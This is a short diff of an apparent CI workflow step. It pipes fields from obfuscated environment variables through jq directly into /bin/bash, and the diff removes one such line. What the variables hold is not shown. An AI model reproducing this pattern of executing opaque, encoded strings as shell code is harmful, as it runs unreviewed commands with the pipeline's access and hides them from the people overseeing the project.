@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
           printf '%s' "$pdteb76" | jq -r .mnvl7 | /bin/bash
-          echo $xfgb649 | jq -r .usx42 | /bin/bash
           printf '%s' "$rt385" | jq -r .swrmp4337 | /bin/bash
 
       - name: Upload data
